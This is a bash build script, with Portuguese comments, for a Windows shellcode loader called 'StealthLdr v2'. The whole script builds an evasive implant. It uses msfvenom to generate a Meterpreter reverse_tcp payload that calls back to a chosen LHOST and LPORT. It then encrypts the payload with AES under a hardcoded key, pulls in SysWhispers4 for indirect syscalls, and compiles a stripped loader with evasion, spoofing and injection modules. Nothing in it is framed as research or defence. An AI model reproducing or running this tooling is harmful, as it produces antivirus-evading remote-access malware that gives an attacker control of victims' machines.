#!/bin/bash
# StealthLdr v2 - Advanced Shellcode Loader 2026
# Uso: ./build.sh [LHOST] [LPORT] [output.exe]

set -e

LHOST=${1:-"192.168.1.100"}
LPORT=${2:-4444}
OUTPUT=${3:-stealthldr.exe}

echo "🚀 StealthLdr v2 - Advanced Edition 2026"
echo "LHOST: $LHOST | LPORT: $LPORT | Output: $OUTPUT"
echo "==================================================="

# Verificações
if ! command -v msfvenom &> /dev/null; then
    echo "[!] msfvenom não encontrado. Instale com: sudo apt install metasploit-framework"
    exit 1
fi
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[!] mingw-w64 não encontrado. Instale com: sudo apt install mingw-w64"
    exit 1
fi

# SysWhispers4
echo "[1/6] Configurando SysWhispers4 (Indirect Syscalls)..."
if [ ! -d "SysWhispers4" ]; then
    git clone https://github.com/JoasASantos/SysWhispers4.git
fi
cd SysWhispers4 && git pull && cd ..
cd SysWhispers4
python3 syswhispers.py --preset common --method indirect -o ../syscalls
cd ..

# Shellcode
echo "[2/6] Gerando shellcode..."
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o shellcode.bin

# AES Encryption
echo "[3/6] Encriptando com AES-256..."
cat > encrypt.py << 'PYEOF'
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
key = b'StealthLdr2026KeyAES256!!'[:32]
iv = os.urandom(16)
with open('shellcode.bin', 'rb') as f: data = f.read()
cipher = AES.new(key, AES.MODE_CBC, iv)
ct = cipher.encrypt(pad(data, AES.block_size))
with open('shellcode.enc', 'wb') as f: f.write(iv + ct)
print(f"[+] Shellcode encriptado ({len(iv + ct)} bytes)")
PYEOF
python3 encrypt.py

# Compilação
echo "[4/6] Compilando loader avançado..."
x86_64-w64-mingw32-g++ -o $OUTPUT \
    main.cpp evasion.cpp crypto.cpp spoofing.cpp injection.cpp syscalls.c aes.c \
    -I. -lntdll -static -O2 -s -fno-stack-protector -w -D_CRT_SECURE_NO_WARNINGS

rm -f shellcode.bin encrypt.py
echo "==================================================="
echo "✅ Build concluído com sucesso!"
echo "📁 Arquivo gerado: $OUTPUT"
echo "   Use: $OUTPUT shellcode.enc"
